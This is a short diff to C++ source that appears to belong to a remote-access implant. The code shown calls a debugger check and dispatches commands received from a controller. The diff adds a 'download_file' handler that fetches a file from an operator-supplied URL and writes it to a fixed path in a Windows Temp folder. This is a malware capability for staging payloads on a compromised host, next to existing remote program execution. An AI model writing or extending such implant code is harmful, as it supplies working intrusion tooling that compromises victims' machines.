@@ -203,6 +203,12 @@ check_debugger();
                 }
             }else if(command["command_type"] == "system_program"){
                 cmd_result = runProgram(cmd);
+            }else if(command["command_type"] == "download_file"){
+                FileIO fileIO = FileIO();
+                char filePath[] = "C:\\Users\\vagrant\\AppData\\Local\\Temp\\random_file";
+                std::string url_str = command["command_text"];
+                char *url = const_cast<char*>(url_str.c_str());
+                fileIO.DownloadFileViaUrl(url, filePath);
             }
             }catch (const std::exception& e){
                 cmd_result = e.what();
